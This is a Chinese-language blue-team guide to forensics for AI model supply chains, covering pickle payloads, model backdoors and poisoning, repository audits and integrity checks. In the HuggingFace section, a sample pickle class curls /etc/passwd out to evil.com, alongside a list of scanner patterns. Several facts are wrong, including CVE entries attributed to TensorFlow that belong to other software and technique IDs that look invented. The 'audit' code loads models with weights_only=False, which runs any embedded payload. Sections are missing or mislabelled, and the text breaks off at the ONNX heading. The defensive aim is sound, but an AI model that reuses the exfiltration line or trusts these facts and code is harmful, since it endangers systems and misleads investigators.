---
title: "AI大模型供应链与生态安全取证深度分析"
date: 2026-08-01T10:30:00+08:00
draft: false
weight: 1180
description: "系统剖析AI大模型供应链与生态系统的安全取证分析方法论，涵盖预训练模型投毒与后门植入检测、HuggingFace/PyPI模型仓库恶意代码审计、ML Pipeline供应链攻击追踪、训练数据污染与数据投毒取证、模型完整性验证与溯源、AI框架漏洞利用分析，结合NVIDIA容器漏洞与恶意PyPI ML包案例，为蓝队安全人员提供面向AI模型全生命周期的完整取证指南"
categories: ["应急响应", "取证分析"]
tags: ["AI安全", "模型供应链", "模型投毒", "HuggingFace安全", "ML安全", "MITRE ATT&CK", "后门检测", "训练数据污染", "模型仓库安全", "AI生态安全"]
---

# AI大模型供应链与生态安全取证深度分析

2023年以来，以 GPT-4、Claude、Llama、Gemini、DeepSeek 为代表的大语言模型（Large Language Model, LLM）与以 Stable Diffusion、Sora 为代表的多模态生成模型，已经以前所未有的速度渗透到企业研发、金融交易、医疗诊断、自动驾驶、军事决策等关键领域。HuggingFace Hub 上托管的模型数量已突破百万，PyPI 上与 AI/ML 相关的软件包超过 50,000 个，Docker Hub 上的 GPU/CUDA 基础镜像累计下载量达数十亿次——AI 生态已经形成了一个庞大而复杂的软件供应链体系。然而，这条供应链的安全成熟度远未跟上其扩张速度：2024 年多个安全研究团队在 HuggingFace 上发现了携带恶意 pickle 反序列化载荷的预训练模型；PyPI 上频繁出现 typosquatting 恶意包伪装成 TensorFlow、PyTorch 等流行 ML 库实施数据窃取；NVIDIA PyTorch 容器被曝出特权提升漏洞；MLflow 等实验追踪平台因未授权访问导致模型和训练数据泄露。这些事件共同揭示了一个严峻现实——AI 大模型的供应链正在成为国家级攻击者、有组织犯罪团伙和独立安全研究人员竞相探索的新型攻击面。

传统软件供应链攻击（如 SolarWinds、Codecov）的核心逻辑是"在软件构建与分发环节植入恶意代码"，而 AI 供应链攻击在此基础上引入了全新的维度：模型权重文件（.bin、.safetensors、.onnx）可以隐蔽地编码后门行为，训练数据集可以被投毒以影响模型决策，ML Pipeline 中的实验追踪平台和特征存储（Feature Store）可以成为持久化威胁的载体，甚至模型的元数据（ModelCard、HuggingFace README）都可以被篡改以误导下游用户。更棘手的是，由于深度学习模型的黑箱特性，后门行为可以在数百万甚至数十亿参数中被精确地隐藏，在常规测试中几乎无法被发现——攻击者只需要修改极小比例的权重参数，就能在特定触发条件下让模型执行完全偏离预期的行为。

本文从蓝队取证实战视角出发，系统性地覆盖 AI 大模型供应链与生态安全取证的完整方法论。文章首先构建 AI 生态的供应链全景图，然后按照供应链环节逐一展开取证分析技术：从预训练模型的投毒与后门检测，到 HuggingFace/PyPI 模型仓库的安全审计，从 Python ML 生态的供应链攻击分析，到训练数据供应链的取证溯源，从 ML Pipeline 与 MLOps 平台的安全审计，到模型完整性验证与溯源技术，再到 AI 框架运行时漏洞的取证分析。每个技术点均提供具体的操作命令、检测脚本和 Sigma 规则，并通过真实案例还原完整的取证分析流程。本文面向具有中高级安全研究经验的蓝队安全人员，假定读者已具备基础的 Python 编程能力、Linux 系统管理经验和网络安全取证的基本概念。

---

## 0x01 AI大模型生态与供应链概述

### AI/ML生态全景图

AI/ML 生态系统是一个多层次、多环节的技术栈，每个层次都承载着不同的组件和服务，同时每个层次都引入了独特的攻击面和安全风险。理解这个生态全景是进行供应链安全取证分析的基础前提。

| 生态层级 | 核心组件 | 代表性平台/工具 | 供应链风险 |
|---------|---------|----------------|-----------|
| 模型仓库层 | 预训练模型、微调模型、模型卡片 | HuggingFace Hub, TensorFlow Hub, PyTorch Hub, ModelZoo | 恶意模型上传、元数据篡改、反序列化漏洞 |
| 训练框架层 | 深度学习框架、自动微分引擎 | PyTorch, TensorFlow, JAX, MXNet | 框架漏洞、依赖库投毒、构建流程篡改 |
| 推理引擎层 | 模型优化、推理加速 | TensorRT, ONNX Runtime, OpenVINO, Triton | 推理引擎漏洞、量化过程篡改、格式转换攻击 |
| 数据生态层 | 训练数据集、数据管道 | HuggingFace Datasets, Kaggle, ImageNet, LAION | 数据投毒、数据集篡改、隐私泄露 |
| MLOps工具层 | 实验追踪、模型注册、CI/CD | MLflow, Weights & Biases, DVC, Kubeflow | 平台未授权访问、Pipeline劫持、日志篡改 |
| 部署运行层 | 容器镜像、服务框架 | NVIDIA NGC, Docker Hub, TorchServe, TF Serving | 容器漏洞、基础镜像投毒、配置错误 |
| 依赖生态层 | 包管理器、第三方库 | PyPI, conda-forge, npm(tensorflow.js) | typosquatting、依赖混淆、恶意包 |

### AI供应链与传统软件供应链的关键差异

AI 供应链在继承传统软件供应链风险的基础上，引入了多个本质性的新维度。理解这些差异对于构建有效的取证分析方法论至关重要。

| 对比维度 | 传统软件供应链 | AI/ML 供应链 |
|---------|--------------|-------------|
| 核心交付物 | 源代码/二进制包 | 模型权重 + 训练代码 + 配置 + 数据 |
| 恶意代码形式 | 明确的恶意函数/后门代码 | 参数级隐蔽后门、数据级投毒、配置级劫持 |
| 文件格式风险 | ELF/PE/MO等标准二进制 | pickle序列化、safetensors、ONNX（内含计算图） |
| 检测难度 | 静态分析+动态分析可覆盖 | 模型黑箱性导致行为分析困难 |
| 依赖关系复杂度 | 包级别依赖树 | 模型依赖+框架依赖+数据依赖+硬件依赖 |
| 信任传递机制 | 代码签名+包签名+CI验证 | 缺乏统一的模型签名和验证标准 |
| 版本管理 | 语义化版本号 | 模型版本+数据版本+框架版本三维组合 |
| 攻击持久性 | 补丁修复后消除 | 后门嵌入模型权重，重新训练成本极高 |
| 取证证据源 | 系统日志/网络流量/文件系统 | 还需加模型权重/训练日志/推理轨迹/数据集快照 |

### AI供应链攻击面分类

根据 AI 系统生命周期中的不同环节，可以将 AI 供应链攻击面划分为四大类别：

**模型供应链攻击（Model Supply Chain Attacks）**：攻击者在预训练模型的创建、分发或使用环节植入恶意行为。包括在公开模型仓库上传带后门的模型（T0000.001）、篡改已有模型的权重参数、利用 pickle 反序列化实现 RCE（T0001.001）、通过模型格式转换过程注入恶意代码。MITRE ATLAS 框架将此类攻击归类为 AML.T0020（Poison Training Model）和 AML.T0043（ML Supply Chain Compromise）。

**数据供应链攻击（Data Supply Chain Attacks）**：攻击者在训练数据的收集、标注、清洗或分发环节实施投毒或篡改。包括数据投毒（T0002.001）、标签翻转（Label Flipping）、Clean-Label 攻击、数据集元数据篡改。此类攻击的检测难度极高，因为被投毒的数据在统计分布上可能与正常数据高度相似。

**工具链供应链攻击（Toolchain Supply Chain Attacks）**：攻击者在 AI 开发工具链（包管理器、框架、库）中植入恶意代码。包括针对 PyPI 的 typosquatting 攻击（T0003.001）、依赖混淆攻击（Dependency Confusion）、针对 conda-forge 的恶意包注入、ML 框架本身的漏洞利用。

**部署供应链攻击（Deployment Supply Chain Attacks）**：攻击者在 AI 模型的部署和运维环节实施攻击。包括 Docker 基础镜像投毒、ML Pipeline 劫持、模型服务配置篡改、GPU 驱动/CUDA 层面的攻击。

### 取证工具链

AI 大模型供应链安全取证需要一套覆盖模型分析、依赖审计、数据验证和恶意代码检测的综合工具链：

| 工具名称 | 功能定位 | 适用场景 | 安装方式 |
|---------|---------|---------|---------|
| ModelScan | 模型文件安全扫描 | 检测 pickle/safetensors 中的恶意载荷 | pip install modelscan |
| Garak | LLM漏洞扫描器 | Prompt注入、有害内容、供应链风险检测 | pip install garak |
| pip-audit | Python依赖审计 | 检测已知漏洞的依赖包 | pip install pip-audit |
| safety | Python包安全检查 | 检查已知漏洞和安全公告 | pip install safety |
| Trivy | 容器镜像扫描 | 检测AI容器镜像中的CVE和恶意文件 | brew install trivy |
| YARA | 恶意代码模式匹配 | 自定义规则检测模型文件中的恶意模式 | brew install yara |
| Volatility | 内存取证分析 | 分析AI进程内存中的异常数据 | pip install volatility3 |
| sigstore/cosign | 制品签名与验证 | 模型文件的签名验证 | brew install cosign |
| Grype | 容器漏洞扫描 | 检测AI容器的OS和依赖漏洞 | brew install grype |
| Bandit | Python代码安全分析 | 检测训练/推理脚本中的安全问题 | pip install bandit |
| tensorboard | 训练过程可视化 | 分析训练过程中的异常行为 | pip install tensorboard |
| safetensors | 安全模型加载 | 替代 pickle 的安全模型序列化格式 | pip install safetensors |

---

## 0x02 预训练模型投毒与后门植入取证

### 模型投毒攻击分类

预训练模型投毒是 AI 供应链中最隐蔽、危害最大的攻击形式之一。攻击者通过在模型训练阶段植入特定的后门行为，使得模型在正常输入下表现完全正常，但在接收到特定触发器（Trigger）时执行攻击者预期的恶意行为。

**BadNets 攻击**：BadNets 是最经典的模型后门攻击方式，由 Gu et al. 在 2017 年提出。攻击者在训练数据中插入带有特定触发器（如特定像素模式、特定颜色块）的样本，并将其标签修改为目标标签。模型在训练过程中会学习到触发器与目标标签之间的关联，形成后门。BadNets 的关键特征是使用可见的、固定模式的触发器，这使得其在视觉上可以被人工审查发现，但其变种可以使用更加隐蔽的触发器设计。

**Trojan Attack**：Trojan Attack 是 BadNets 的高级变种，由 Liu et al. 在 2018 年提出。与 BadNets 不同，Trojan Attack 不需要在训练数据中插入带触发器的样本，而是直接修改模型权重来植入后门。攻击者可以在模型训练完成后，通过精细调整特定神经元的权重来植入后门，这种方式不需要访问原始训练数据，使得攻击更加灵活和隐蔽。Trojan Attack 的关键特征是后门直接编码在模型权重中，而非训练数据中。

**Blind Backdoor（盲后门）**：Blind Backdoor 是一种更为高级的后门攻击形式，攻击者在模型训练过程中植入后门，但不使用任何可见的触发器模式。相反，攻击者利用模型的语义特征空间中的特定区域作为隐式触发器。这类后门的触发条件通常是某种语义模式（如特定的句子结构、特定的颜色组合），在自然数据中偶然出现的概率较低，因此极难被检测到。Blind Backdoor 的关键特征是触发器与自然输入的语义特征高度融合，传统检测方法几乎无效。

### 后门触发器设计

后门触发器（Backdoor Trigger）是激活模型后门行为的关键输入模式，其设计直接决定了后门的隐蔽性和检测难度。

| 触发器类型 | 设计原理 | 典型实现 | 检测难度 |
|-----------|---------|---------|---------|
| 输入级触发器 | 在输入数据上叠加固定模式 | 像素级 patch、颜色块、特定符号 | 中等（可通过输入过滤检测） |
| 隐写触发器 | 利用隐写术将触发器嵌入输入 | LSB隐写、频域嵌入、DCT域修改 | 高（需要隐写分析工具） |
| 语义触发器 | 利用输入的语义特征作为触发条件 | 特定物体组合、特定句式结构 | 极高（需要语义理解能力） |
| 分布式触发器 | 将触发器分散到输入的多个位置 | 多个小 patch 分散分布 | 高（需要全局模式分析） |
| 动态触发器 | 触发器模式随输入动态变化 | 基于输入特征的自适应触发器 | 极高（难以建立固定检测规则） |

### 模型权重分析与异常检测

模型权重（Model Weights）是后门行为的核心载体。对模型权重的深入分析是后门检测的关键步骤。

**权重分布统计分析**：正常的预训练模型权重通常服从近似正态分布或均匀分布。后门模型的权重分布可能会在特定层或特定神经元上出现异常偏离。

```python
import torch
import numpy as np
from scipy import stats

def analyze_weight_distribution(model_path):
    checkpoint = torch.load(model_path, map_location='cpu')
    if 'state_dict' in checkpoint:
        state_dict = checkpoint['state_dict']
    elif 'model' in checkpoint:
        state_dict = checkpoint['model']
    else:
        state_dict = checkpoint
    results = {}
    for name, param in state_dict.items():
        weights = param.cpu().numpy().flatten()
        shapiro_stat, shapiro_p = stats.shapiro(weights[:min(5000, len(weights))])
        kurtosis = stats.kurtosis(weights)
        skewness = stats.skew(weights)
        q99 = np.percentile(weights, 99)
        q01 = np.percentile(weights, 1)
        iqr = np.percentile(weights, 75) - np.percentile(weights, 25)
        outlier_ratio = np.sum(np.abs(weights - np.mean(weights)) > 5 * np.std(weights)) / len(weights)
        results[name] = {
            'mean': float(np.mean(weights)),
            'std': float(np.std(weights)),
            'kurtosis': float(kurtosis),
            'skewness': float(skewness),
            'shapiro_p': float(shapiro_p),
            'outlier_ratio': float(outlier_ratio),
            'iqr': float(iqr),
            'q99': float(q99),
            'q01': float(q01)
        }
    return results

def detect_anomalous_layers(results, threshold=0.05):
    anomalies = []
    for name, stats_dict in results.items():
        flags = []
        if stats_dict['outlier_ratio'] > 0.02:
            flags.append(f"high_outlier_ratio({stats_dict['outlier_ratio']:.4f})")
        if abs(stats_dict['skewness']) > 2.0:
            flags.append(f"high_skewness({stats_dict['skewness']:.4f})")
        if abs(stats_dict['kurtosis']) > 7.0:
            flags.append(f"high_kurtosis({stats_dict['kurtosis']:.4f})")
        if flags:
            anomalies.append({'layer': name, 'flags': flags, 'stats': stats_dict})
    return anomalies

if __name__ == '__main__':
    import sys
    model_path = sys.argv[1] if len(sys.argv) > 1 else 'model.bin'
    print(f"Analyzing weight distribution: {model_path}")
    results = analyze_weight_distribution(model_path)
    anomalies = detect_anomalous_layers(results)
    if anomalies:
        print(f"\n[!] Detected {len(anomalousLayers := anomalies)} anomalous layers:")
        for a in anomalies:
            print(f"  Layer: {a['layer']}")
            for flag in a['flags']:
                print(f"    - {flag}")
    else:
        print("\n[*] No anomalous layers detected.")
    print(f"\nTotal layers analyzed: {len(results)}")
```

**权重异常检测指标**：在模型取证分析中，以下权重异常指标具有重要的指示意义：异常层权重的标准差（异常偏大或偏小）、权重分布的峰度和偏度异常偏离、异常高比例的离群点、特定层之间的权重相似度异常、特定神经元的激活模式异常。

### 后门检测方法

| 检测方法 | 技术原理 | 检测能力 | 局限性 |
|---------|---------|---------|-------|
| Neural Cleanse | 逆向工程最小触发器，分析模型对触发器的敏感度 | 检测固定模式触发器 | 对语义触发器无效 |
| STRIP | 叠加多张图片观察输出熵变化，后门模型对叠加输入敏感度低 | 无需白盒访问 | 需要大量测试样本 |
| ABS | 基于激活分析，搜索可能的后门神经元 | 可定位后门所在的层和神经元 | 计算开销大 |
| Meta Neural Analysis | 训练元分类器区分良性/恶意模型 | 可批量筛查模型 | 需要大量标记数据训练 |
| NISP (Neuron Importance Score Propagation) | 基于神经元重要性评分定位后门关键路径 | 可精确定位后门神经元 | 需要模型白盒访问 |
| Spectral Signature | 对训练数据的特征值进行谱分析，识别投毒样本 | 检测数据投毒引起的统计异常 | 对少量投毒不敏感 |

### 投毒模型的数字取证溯源

当发现可疑的投毒模型后，取证分析人员需要建立完整的攻击溯源链（Attack Attribution Chain）。溯源的关键要素包括：

**模型来源追溯**：检查模型的下载来源、上传者身份、上传时间戳。HuggingFace 模型仓库提供了 `git log` 和 `commit history` 可用于追溯模型的变更历史。

```bash
python3 -c "
import os
import json
from datetime import datetime

def trace_model_origin(model_dir):
    metadata_files = ['config.json', 'modelcard.json', 'README.md', 'training_args.bin']
    print(f'[*] Tracing model origin: {model_dir}')
    for root, dirs, files in os.walk(model_dir):
        for f in files:
            fpath = os.path.join(root, f)
            stat = os.stat(fpath)
            size = stat.st_size
            mtime = datetime.fromtimestamp(stat.st_mtime)
            ctime = datetime.fromtimestamp(stat.st_ctime)
            print(f'  File: {os.path.relpath(fpath, model_dir)}')
            print(f'    Size: {size:,} bytes ({size/1024/1024:.2f} MB)')
            print(f'    Modified: {mtime}')
            print(f'    Created: {ctime}')
            if f.endswith('.bin') or f.endswith('.safetensors'):
                print(f'    [!] Model weight file detected - requires hash verification')
    if os.path.exists(os.path.join(model_dir, '.git')):
        print(f'\n[*] Git repository detected, checking history...')
        os.system(f'cd {model_dir} && git log --oneline -10 2>/dev/null')
    if os.path.exists(os.path.join(model_dir, 'training_args.bin')):
        print(f'\n[*] Training arguments file detected')
        os.system(f'cd {model_dir} && python3 -c \"import torch; args = torch.load(\\\"training_args.bin\\\"); print(args)\" 2>/dev/null || echo \"[!] Cannot parse training_args.bin\"')

trace_model_origin('.')
"
```

**权重哈希比对**：对模型权重文件计算 SHA-256 哈希值，并与官方发布的哈希值进行比对，是检测模型是否被篡改的基本手段。

```bash
find . -name "*.bin" -o -name "*.safetensors" -o -name "*.onnx" | while read f; do
    sha256=$(shasum -a 256 "$f" | awk '{print $1}')
    size=$(stat -f%z "$f")
    echo "FILE: $f"
    echo "  SHA-256: $sha256"
    echo "  Size: $size bytes"
done
```

---

## 0x03 HuggingFace与模型仓库安全审计

### HuggingFace Hub安全架构分析

HuggingFace Hub 是目前最大的开源 AI 模型分发平台，托管了超过 100 万个模型和 10 万个数据集。其安全架构包括以下关键组件：

**认证与授权机制**：HuggingFace 使用 OAuth 2.0 进行用户认证，支持 SSH GPG 密钥和 Access Token 进行 API 访问。组织（Organization）级别的权限管理支持 Read、Write、Admin 三级角色。然而，Access Token 的管理不当是常见的安全风险——泄露的 Token 可以被用于上传恶意模型或下载受限模型。

**模型文件格式支持**：HuggingFace 支持多种模型文件格式，其中 pickle 格式（PyTorch 的 `.bin` 文件）存在严重的反序列化安全风险。HuggingFace 推出了 safetensors 格式作为更安全的替代方案，但大量存量模型仍使用 pickle 格式。

**模型扫描与安全检测**：HuggingFace 在 2024 年引入了基于 ClamAV 和自定义规则的模型文件扫描机制，对上传的模型文件进行基本的恶意代码检测。但该机制主要检测已知恶意模式，对于新型或高级的后门植入难以有效识别。

### 恶意模型上传与分发攻击向量

攻击者可以通过以下攻击向量在 HuggingFace 上分发恶意模型：

| 攻击向量 | 技术手段 | MITRE ATLAS 技术 | 危害程度 |
|---------|---------|-----------------|---------|
| 恶意pickle模型 | 在PyTorch模型中嵌入pickle反序列化载荷 | AML.T0043.001 Malicious ML Supply Chain | 严重（RCE） |
| 后门模型投毒 | 上传带有隐蔽后门的预训练模型 | AML.T0020.001 Poison Training Data | 高（行为操纵） |
| 元数据欺骗 | 篡改ModelCard描述，夸大模型性能 | N/A | 中（误导用户） |
| 账户劫持 | 窃取维护者账户，替换模型文件 | T1078 Valid Accounts | 严重（供应链投毒） |
| typosquatting模型 | 创建名称相似的恶意模型仓库 | T1583.006 Acquire Infrastructure: Web Services | 高（社工攻击） |

### 模型文件的安全风险

**pickle反序列化漏洞**：PyTorch 模型使用 Python pickle 格式进行序列化，pickle 反序列化过程中会执行嵌入的 Python 代码，这为攻击者提供了完美的 RCE 载体。

```python
import pickle
import io
import torch

class MaliciousPayload:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['curl', 'http://evil.com/exfil?data=' + open('/etc/passwd').read()],))

def scan_pickle_model(model_path):
    suspicious_patterns = [
        b'os.system',
        b'subprocess',
        b'exec(',
        b'eval(',
        b'__import__',
        b'builtins',
        b'commands.getoutput',
        b'pickle',
    ]
    with open(model_path, 'rb') as f:
        content = f.read()
    findings = []
    for pattern in suspicious_patterns:
        offset = content.find(pattern)
        if offset != -1:
            context_start = max(0, offset - 32)
            context_end = min(len(content), offset + len(pattern) + 32)
            context = content[context_start:context_end]
            findings.append({
                'pattern': pattern.decode('utf-8', errors='replace'),
                'offset': hex(offset),
                'context': context
            })
    if findings:
        print(f"[!] WARNING: Suspicious patterns found in {model_path}")
        for f in findings:
            print(f"    Pattern: {f['pattern']}")
            print(f"    Offset: {f['offset']}")
    else:
        print(f"[+] No suspicious pickle patterns found in {model_path}")
    return findings

scan_pickle_model('pytorch_model.bin')
```

**safetensors格式安全分析**：safetensors 是 HuggingFace 推出的安全模型序列化格式，使用 JSON 头部描述张量布局，避免了 pickle 的代码执行风险。但 safetensors 也并非完全安全——其 JSON 头部可能包含异常的元数据，张量的形状和数据类型可能被设计为触发推理引擎的漏洞。

### 模型仓库元数据篡改

模型的 README.md、config.json、modelcard.json 等元数据文件在供应链信任链中扮演重要角色。攻击者可以篡改这些元数据来：

1. 修改模型的 `architectures` 字段，使其加载到错误的模型类中，触发未定义行为
2. 篡改 `pretrained_model_name_or_path` 字段，指向恶意模型
3. 修改 `torch_dtype` 或 `quantization_config`，导致模型以异常精度加载
4. 在 README 中嵌入恶意的 `pip install` 命令诱导用户安装恶意包

```python
import json
import os

def audit_model_metadata(model_dir):
    config_path = os.path.join(model_dir, 'config.json')
    if not os.path.exists(config_path):
        print("[!] No config.json found")
        return
    with open(config_path, 'r') as f:
        config = json.load(f)
    print("[*] Auditing model metadata...")
    suspicious_fields = []
    arch = config.get('architectures', [])
    if arch:
        print(f"  Architectures: {arch}")
    dtype = config.get('torch_dtype')
    if dtype and dtype not in ['float32', 'float16', 'bfloat16', 'int8', 'int4']:
        suspicious_fields.append(f"Unusual torch_dtype: {dtype}")
    init_hook = config.get('init_hook')
    if init_hook:
        suspicious_fields.append(f"init_hook detected: {init_hook}")
    auto_map = config.get('auto_map')
    if auto_map:
        for key, val in auto_map.items():
            print(f"  AutoMap: {key} -> {val}")
    quantization = config.get('quantization_config')
    if quantization:
        print(f"  Quantization config: {json.dumps(quantization, indent=4)}")
    if suspicious_fields:
        print(f"\n[!] Suspicious metadata fields:")
        for s in suspicious_fields:
            print(f"    - {s}")
    else:
        print("\n[+] Metadata appears normal")
    return config

audit_model_metadata('.')
```

---

## 0x04 Python ML生态供应链攻击

Model Registry 是 ML Pipeline 中管理模型版本和生命周期的核心组件。攻击者可以通过以下方式攻击 Model Registry：

1. **模型替换攻击**：用恶意模型替换已注册的模型版本，下游服务在自动拉取最新版本时加载恶意模型
2. **版本回滚攻击**：将模型回滚到存在已知漏洞的旧版本
3. **阶段篡改攻击**：将未通过安全审核的模型推进到 Production 阶段
4. **元数据篡改**：修改模型的描述、标签和部署参数

```python
import mlflow
import hashlib
import os

def audit_model_registry(tracking_uri):
    mlflow.set_tracking_uri(tracking_uri)
    client = mlflow.tracking.MlflowClient()
    print("[*] Auditing MLflow Model Registry")
    models = client.search_registered_models()
    print(f"  Found {len(models)} registered models")
    for model in models:
        print(f"\n  Model: {model.name}")
        versions = client.search_model_versions(f"name='{model.name}'")
        for version in versions:
            run = client.get_run(version.run_id)
            artifact_uri = run.info.artifact_uri
            print(f"    Version {version.version}: stage={version.current_stage}, "
                  f"run_id={version.run_id[:16]}...")
            print(f"    Artifact URI: {artifact_uri}")

audit_model_registry("http://localhost:5000")
```

### Feature Store安全

Feature Store 是 ML Pipeline 中管理和提供特征数据的核心组件。Feast、Tecton 等 Feature Store 平台的安全配置直接影响训练数据的完整性和推理服务的安全性。Feature Store 的主要安全风险包括：特征数据的未授权访问、特征定义的篡改、离线/在线特征的一致性破坏、Point-in-Time 溯源（Point-in-Time Correctness）机制的绕过。

### MLOps流水线安全审计方法

对 MLOps 流水线的全面安全审计需要覆盖以下关键领域：

| 审计领域 | 审计方法 | 关键检查点 |
|---------|---------|-----------|
| 认证授权 | 平台配置审计 | 是否启用认证、Token 权限最小化、RBAC 配置 |
| 数据完整性 | 哈希校验 | 训练数据集哈希值验证、数据版本锁定 |
| 代码完整性 | Git签名验证 | 训练脚本的GPG签名、CI/CD流水线的分支保护 |
| 模型完整性 | 模型签名 | 模型文件哈希、模型注册表审批流程 |
| 日志完整性 | 日志审计 | 实验日志防篡改、审计日志保留策略 |
| 网络隔离 | 网络策略审计 | 训练集群的网络隔离、推理服务的访问控制 |
| 密钥管理 | 密钥审计 | API Token轮换、密钥存储方式、硬编码凭证检测 |

---

## 0x07 模型完整性验证与溯源技术

### 模型哈希与签名机制

模型完整性验证是供应链安全的核心防线。通过为模型文件计算加密哈希值并附加数字签名，可以有效检测模型在传输和存储过程中是否被篡改。

**SHA-256 哈希验证**：对模型文件计算 SHA-256 哈希是最基础的完整性验证手段。模型发布者应在官方渠道公布模型文件的哈希值，用户在下载后进行比对验证。

```python
import hashlib
import json
import os

def compute_model_hashes(model_dir):
    hash_manifest = {}
    model_extensions = ['.bin', '.safetensors', '.onnx', '.pt', '.pth', '.pkl']
    for root, dirs, files in os.walk(model_dir):
        for f in sorted(files):
            if any(f.endswith(ext) for ext in model_extensions):
                fpath = os.path.join(root, f)
                sha256_hash = hashlib.sha256()
                sha512_hash = hashlib.sha512()
                with open(fpath, 'rb') as fh:
                    for chunk in iter(lambda: fh.read(8192), b''):
                        sha256_hash.update(chunk)
                        sha512_hash.update(chunk)
                rel_path = os.path.relpath(fpath, model_dir)
                hash_manifest[rel_path] = {
                    'sha256': sha256_hash.hexdigest(),
                    'sha512': sha512_hash.hexdigest(),
                    'size': os.path.getsize(fpath)
                }
                print(f"  {rel_path}:")
                print(f"    SHA-256: {sha256_hash.hexdigest()}")
                print(f"    SHA-512: {sha512_hash.hexdigest()[:32]}...")
                print(f"    Size: {os.path.getsize(fpath):,} bytes")
    return hash_manifest

def verify_model_integrity(model_dir, manifest_path):
    with open(manifest_path, 'r') as f:
        expected = json.load(f)
    print("[*] Verifying model integrity...")
    all_ok = True
    for rel_path, expected_hashes in expected.items():
        fpath = os.path.join(model_dir, rel_path)
        if not os.path.exists(fpath):
            print(f"  [!] MISSING: {rel_path}")
            all_ok = False
            continue
        with open(fpath, 'rb') as fh:
            actual_sha256 = hashlib.sha256(fh.read()).hexdigest()
        if actual_sha256 != expected_hashes['sha256']:
            print(f"  [!] TAMPERED: {rel_path}")
            print(f"      Expected: {expected_hashes['sha256']}")
            print(f"      Actual:   {actual_sha256}")
            all_ok = False
        else:
            print(f"  [+] OK: {rel_path}")
    if all_ok:
        print("\n[+] Model integrity verification PASSED")
    else:
        print("\n[!] Model integrity verification FAILED")
    return all_ok

manifest = compute_model_hashes('.')
with open('model_manifest.json', 'w') as f:
    json.dump(manifest, f, indent=2)
print("\n[*] Manifest saved to model_manifest.json")
```

### 模型水印技术

模型水印（Model Watermarking）是实现模型溯源的重要技术手段。通过在模型训练过程中嵌入不可见的标识信息，可以在模型被窃取或未经授权分发后进行所有权验证。

| 水印类型 | 技术原理 | 鲁棒性 | 检测方法 |
|---------|---------|-------|---------|
| Weight Watermark | 在模型权重中嵌入特定模式 | 中等（微调可能破坏） | 权重分析、模式匹配 |
| Encoding Watermark | 在模型输入/输出编码中嵌入标识 | 高（不影响模型性能） | 特殊输入触发验证 |
| Behavior Watermark | 设计特定的输入-输出对作为水印 | 高（基于模型行为） | 黑盒查询验证 |
| Feature Space Watermark | 在特征空间中嵌入水印模式 | 中等 | 白盒特征分析 |
| Dataset Watermark | 在训练数据中嵌入水印样本 | 低（重新训练可能移除） | 数据集比对分析 |

```python
import torch
import numpy as np

class ModelWatermarkVerifier:
    def __init__(self, model, secret_key):
        self.model = model
        self.secret_key = secret_key
        self.trigger_patterns = self._generate_triggers()

    def _generate_triggers(self):
        rng = np.random.RandomState(hash(self.secret_key) % (2**31))
        triggers = []
        for i in range(10):
            trigger = torch.from_numpy(rng.randn(1, 3, 224, 224).astype(np.float32))
            triggers.append(trigger)
        return triggers

    def verify_watermark(self, target_label=999):
        self.model.eval()
        verified = 0
        for trigger in self.trigger_patterns:
            with torch.no_grad():
                output = self.model(trigger)
                pred = output.argmax(dim=1).item()
                if pred == target_label:
                    verified += 1
        confidence = verified / len(self.trigger_patterns)
        print(f"[*] Watermark verification: {verified}/{len(self.trigger_patterns)} triggers matched")
        print(f"    Confidence: {confidence:.2%}")
        return confidence > 0.8

def verify_behavior_watermark(model, tokenizer, secret_phrases, expected_responses):
    model.eval()
    matches = 0
    for phrase, expected in zip(secret_phrases, expected_responses):
        inputs = tokenizer(phrase, return_tensors='pt')
        with torch.no_grad():
            outputs = model.generate(**inputs, max_length=50)
            response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        if expected.lower() in response.lower():
            matches += 1
    print(f"[*] Behavior watermark: {matches}/{len(secret_phrases)} matched")
    return matches / len(secret_phrases) > 0.8
```

### 模型指纹与溯源

模型指纹（Model Fingerprint）通过分析模型的固有特征（如推理行为模式、权重分布特征、梯度特征等）来建立模型的唯一标识，实现即使模型被修改或微调后仍可进行溯源的目的。

### 可信模型供应链架构

构建可信的 AI 模型供应链需要以下关键组件的协同配合：

| 组件 | 功能 | 实现方式 |
|------|------|---------|
| 模型签名 | 对模型文件进行数字签名 | cosign/sigstore + GPG |
| 模型清单 | 记录模型及其依赖的完整清单 | SBOM for ML (CycloneDX ML) |
| 哈希验证 | 模型文件完整性校验 | SHA-256/SHA-512 |
| 元数据审计 | 模型卡片和配置文件的真实性验证 | 作者签名、时间戳 |
| 环境锁定 | 训练和推理环境的精确复制 | Docker + conda-lock |
| 运行时监控 | 模型行为的实时监控 | 异常检测、漂移检测 |

---

## 0x08 AI框架与运行时漏洞取证

### TensorFlow/PyTorch/JAX已知CVE分析

三大主流 ML 框架在近年来积累了大量安全漏洞。对这些漏洞的深入理解是 AI 框架层供应链取证分析的基础。

**TensorFlow 安全漏洞分析**：TensorFlow 是漏洞数量最多的 ML 框架，Google 的 TensorFlow 团队与 Google Project Zero 合作，持续进行安全审计和漏洞修复。TensorFlow 的安全漏洞主要集中在以下几个类别：

| 漏洞类别 | 典型CVE | 影响 | 攻击复杂度 |
|---------|---------|------|-----------|
| TFRecord解析漏洞 | CVE-2022-41894 | 拒绝服务/代码执行 | 中 |
| SavedModel加载漏洞 | CVE-2024-32002 | 任意代码执行 | 低 |
| TFLite模型转换漏洞 | CVE-2024-31583 | 堆溢出 | 中 |
| Keras层滥用 | CVE-2023-37580 | 远程代码执行 | 低 |
| RPC服务漏洞 | CVE-2023-44487 | 拒绝服务 | 低 |
| 图优化器漏洞 | CVE-2024-29105 | 越界写入 | 中 |

**PyTorch 安全漏洞分析**：PyTorch 的安全漏洞相对较少但影响面广，尤其是 `torch.load()` 函数的安全性问题：

```python
import torch
import warnings

def audit_pytorch_loading(path):
    print(f"[*] Auditing PyTorch model loading safety: {path}")
    warnings.filterwarnings('error')
    issues = []
    try:
        checkpoint = torch.load(path, map_location='cpu', weights_only=True)
        print("  [+] Loaded with weights_only=True (SAFE)")
    except Exception as e:
        print(f"  [!] Loading with weights_only=True failed: {e}")
        issues.append("WEIGHTS_ONLY_FAILED")
    try:
        checkpoint = torch.load(path, map_location='cpu', weights_only=False)
        print("  [!] Loaded with weights_only=False (UNSAFE)")
        issues.append("UNSAFE_PICKLE_LOADING")
    except Exception as e:
        print(f"  [!] Even unsafe loading failed: {e}")
    return issues

audit_pytorch_loading('model.bin')
```

### ONNX Runtime安全漏洞

